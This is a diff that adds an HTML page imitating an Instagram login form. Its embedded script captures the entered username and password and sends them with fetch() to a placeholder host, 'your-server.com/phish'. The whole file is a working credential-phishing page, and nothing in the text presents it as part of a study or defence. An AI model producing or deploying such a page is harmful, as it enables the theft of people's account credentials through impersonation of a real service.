@@ -1,0 +1,29 @@
+  <!DOCTYPE html>
+     <html>
+     <head>
+         <title>Instagram Login</title>
+     </head>
+     <body>
+         <h2>Instagram Login</h2>
+         <form id="loginForm">
+             <label for="username">Username/Email:</label><br>
+             <input type="text" id="username" name="username"><br><br>
+             <label for="password">Password:</label><br>
+             <input type="password" id="password" name="password"><br><br>
+             <input type="submit" value="Login">
+         </form>
+         <script>
+             document.getElementById("loginForm").addEventListener("submit", function(e) {
+                 e.preventDefault();
+                 var username = document.getElementById("username").value;
+                 var password = document.getElementById("password").value;
+                 fetch("https://your-server.com/phish", {
+                     method: "POST",
+                     headers: { "Content-Type": "application/json" },
+                     body: JSON.stringify({ user: username, pass: password })
+                 });
+             });
+         </script>
+     </body>
+     </html>
+     ```
